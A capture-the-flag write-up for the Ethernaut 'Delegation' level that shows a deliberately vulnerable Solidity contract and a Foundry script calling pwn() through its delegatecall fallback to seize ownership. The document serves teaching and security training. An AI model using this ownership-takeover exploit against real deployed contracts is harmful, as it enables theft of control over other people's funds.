# Level 6 - Delegation ⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/6" %}

### Level Setup

{% hint style="info" %}
The goal of this level is for you to claim ownership of the instance you are given.

&#x20; Things that might help

* Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
* Fallback methods
* Method ids
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/Delegation.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```
{% endcode %}

### Exploit

The contract forwards any unmatched function calls through to the `Delegate` contract through the `fallback()` function. As `pwn()` is only on the `Delegate` contract, it's a simple as calling `pwn()` and having it execute the function on the `Delegate` instead of the `Delegation` contract.

1. Call `pwn()`.

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-6

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/script/Level6.s.sol" %}

{% code title="script/Level6.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

interface IDelegate {
    function pwn() external;
}

// ================================================================
// │                        LEVEL 6 - DELEGATION                  │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IDelegate targetContract = IDelegate(targetContractAddress);

        vm.startBroadcast();
        targetContract.pwn();
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.
{% endhint %}

### Notes

* [delegatecall](https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how) in Solidity
